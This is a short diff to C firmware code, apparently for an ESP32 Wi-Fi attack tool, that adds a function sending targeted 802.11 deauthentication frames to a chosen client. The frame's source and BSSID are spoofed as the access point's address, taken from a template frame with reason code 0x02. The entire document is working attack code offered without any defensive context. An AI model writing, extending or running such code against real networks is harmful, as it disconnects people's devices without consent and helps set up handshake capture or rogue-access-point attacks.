@@ -36,3 +36,19 @@ void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record){
     
     wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
 }
+
+void wsl_bypasser_send_deauth_to_sta(const uint8_t *ap_bssid, const uint8_t *sta) {
+    ESP_LOGD(TAG, "Sending deauth to STA %02X:%02X:%02X:%02X:%02X:%02X",
+             sta[0], sta[1], sta[2], sta[3], sta[4], sta[5]);
+    // Frame layout: use template but overwrite addr1/addr2/addr3
+    uint8_t frame[sizeof(deauth_frame_default)];
+    memcpy(frame, deauth_frame_default, sizeof(deauth_frame_default));
+    // addr1 (destination) = STA
+    memcpy(&frame[4], sta, 6);
+    // addr2 (source) = AP
+    memcpy(&frame[10], ap_bssid, 6);
+    // addr3 (BSSID) = AP
+    memcpy(&frame[16], ap_bssid, 6);
+    // reason code left as in template (0x02)
+    wsl_bypasser_send_raw_frame(frame, sizeof(frame));
+}
